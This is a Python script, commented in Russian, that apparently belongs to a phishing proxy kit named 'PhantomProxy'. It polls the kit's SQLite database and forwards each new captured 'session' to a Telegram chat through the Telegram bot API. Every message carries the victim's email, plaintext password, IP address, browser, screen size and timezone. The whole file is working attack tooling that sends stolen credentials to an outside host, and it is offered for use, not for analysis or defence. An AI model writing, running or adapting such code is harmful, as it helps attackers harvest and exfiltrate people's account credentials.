#!/usr/bin/env python3
"""
Telegram Bot для уведомлений о новых сессиях
"""

import requests
import sqlite3
import time
import os
from datetime import datetime

# Конфигурация
TELEGRAM_BOT_TOKEN = os.environ.get('TELEGRAM_BOT_TOKEN', 'YOUR_BOT_TOKEN')
TELEGRAM_CHAT_ID = os.environ.get('TELEGRAM_CHAT_ID', 'YOUR_CHAT_ID')
DB_PATH = '/home/ubuntu/phantom-proxy/phantom.db'

class TelegramNotifier:
    def __init__(self):
        self.last_session_id = 0
        self.api_url = f'https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}'
    
    def get_last_session_id(self):
        try:
            conn = sqlite3.connect(DB_PATH)
            c = conn.cursor()
            c.execute('SELECT MAX(id) FROM sessions')
            result = c.fetchone()[0]
            conn.close()
            return result or 0
        except:
            return 0
    
    def get_new_sessions(self):
        try:
            conn = sqlite3.connect(DB_PATH)
            conn.row_factory = sqlite3.Row
            c = conn.cursor()
            c.execute('SELECT * FROM sessions WHERE id > ? ORDER BY id DESC', (self.last_session_id,))
            sessions = c.fetchall()
            conn.close()
            return sessions
        except:
            return []
    
    def send_message(self, message):
        try:
            url = f'{self.api_url}/sendMessage'
            data = {
                'chat_id': TELEGRAM_CHAT_ID,
                'text': message,
                'parse_mode': 'HTML'
            }
            requests.post(url, json=data, timeout=10)
            return True
        except Exception as e:
            print(f'Error sending telegram: {e}')
            return False
    
    def format_session(self, session):
        return f"""
🎯 <b>НОВАЯ СЕССИЯ!</b>

📧 <b>Email:</b> {session['email']}
🔑 <b>Password:</b> {session['password']}
🏢 <b>Service:</b> {session['service']}
🌐 <b>IP:</b> {session['ip']}
📱 <b>Browser:</b> {session['user_agent'][:50]}...
🖥️ <b>Screen:</b> {session['screen_resolution']}
🕐 <b>Timezone:</b> {session['timezone']}
⏰ <b>Time:</b> {session['created_at']}

#PhantomProxy #NewSession
"""
    
    def check_and_notify(self):
        current_id = self.get_last_session_id()
        
        if current_id > self.last_session_id:
            sessions = self.get_new_sessions()
            
            for session in sessions:
                message = self.format_session(session)
                self.send_message(message)
                print(f'✅ Notification sent for session {session["id"]}')
            
            self.last_session_id = current_id
    
    def run(self):
        print('🤖 Telegram Bot started')
        self.last_session_id = self.get_last_session_id()
        print(f'Last session ID: {self.last_session_id}')
        
        while True:
            self.check_and_notify()
            time.sleep(10)

if __name__ == '__main__':
    bot = TelegramNotifier()
    bot.run()
